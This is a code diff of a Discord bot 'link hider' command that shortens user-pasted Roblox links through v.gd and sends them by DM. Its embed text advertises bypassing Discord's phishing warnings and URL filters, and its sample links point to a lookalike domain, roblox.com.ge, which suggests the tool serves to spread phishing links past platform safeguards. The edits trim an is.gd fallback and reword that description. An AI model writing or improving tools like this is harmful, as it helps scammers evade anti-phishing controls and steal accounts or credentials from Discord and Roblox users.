@@ -20,7 +20,7 @@ class LinkModal(ui.Modal, title="Paste Your Roblox Link"):
     
     link = ui.TextInput(
         label="Roblox Link *",
-        placeholder="https://roblox.com.ge/users/123456/profile\nили\nhttps://roblox.com.ge/games/123456/Game?privateServerLinkCode=xxx",
+        placeholder="https://roblox.com.ge/users/123456/profile",
         style=discord.TextStyle.paragraph,
         required=True
     )
@@ -35,10 +35,7 @@ class LinkModal(ui.Modal, title="Paste Your Roblox Link"):
     
     async def shorten_url(self, session, original_url):
         try:
-            headers = {
-                'User-Agent': 'Mozilla/5.0',
-                'Content-Type': 'application/x-www-form-urlencoded',
-            }
+            headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
             data = {'url': original_url, 'shorturl': '', 'Publish': 'Create'}
             async with session.post('https://v.gd/create.php', data=data, headers=headers, timeout=15) as resp:
                 text = await resp.text()
@@ -47,21 +44,6 @@ class LinkModal(ui.Modal, title="Paste Your Roblox Link"):
                     return match.group(0)
         except:
             pass
-        
-        try:
-            headers = {
-                'User-Agent': 'Mozilla/5.0',
-                'Content-Type': 'application/x-www-form-urlencoded',
-            }
-            data = {'url': original_url, 'shorturl': '', 'submit': 'Shorten!'}
-            async with session.post('https://is.gd/create.php', data=data, headers=headers, timeout=15) as resp:
-                text = await resp.text()
-                match = re.search(r'https://is\.gd/[a-zA-Z0-9]+', text)
-                if match:
-                    return match.group(0)
-        except:
-            pass
-        
         return None
     
     async def on_submit(self, interaction: discord.Interaction):
@@ -80,7 +62,7 @@ class LinkModal(ui.Modal, title="Paste Your Roblox Link"):
                 await interaction.user.send(message)
                 await interaction.followup.send("✅ Done! Check your DMs.", ephemeral=True)
             else:
-                await interaction.followup.send("❌ Failed to shorten link. Try again later.", ephemeral=True)
+                await interaction.followup.send("❌ Failed to shorten link.", ephemeral=True)
         except Exception as e:
             await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
 
@@ -91,20 +73,17 @@ async def linkhider(interaction: discord.Interaction):
         description=(
             "**Hide your link and bypass Discord warnings & errors**\n\n"
             "**WHAT IS LINK HIDER?**\n"
-            "• A tool that converts your link into a safe format that bypasses Discord's phishing warnings and URL blocks\n\n"
+            "• A tool that converts your Roblox link into a safe format\n\n"
             "**WHY USE IT?**\n"
             "• No more warning pages\n"
             "• Bypass Discord URL filters\n"
-            "• Clean redirects\n"
-            "• **100% working method**\n\n"
+            "• Works with profile and private server links\n"
+            "• Clean redirects\n\n"
             "**HOW IT WORKS**\n"
             "1. Click 'CREATE HYPERLINK' below\n"
-            "2. Paste your link in the window\n"
+            "2. Paste your Roblox link\n"
             "3. Get your hidden link in DMs\n"
-            "4. Share safely anywhere\n\n"
-            "**SUPPORTED LINKS**\n"
-            "• Profile: `https://roblox.com.ge/users/123456/profile`\n"
-            "• Private Server: `https://roblox.com.ge/games/123456/Game?privateServerLinkCode=xxx`"
+            "4. Share safely anywhere"
         ),
         color=discord.Color.blue()
     )
@@ -126,8 +105,11 @@ async def on_interaction(interaction: discord.Interaction):
 @bot.event
 async def on_ready():
     print(f'✅ Bot {bot.user} is online!')
-    await bot.tree.sync()
-    print("✅ Commands synced!")
+    try:
+        synced = await bot.tree.sync()
+        print(f"✅ Synced {len(synced)} commands")
+    except Exception as e:
+        print(f"Sync error: {e}")
 
 if __name__ == "__main__":
     bot.run(TOKEN)
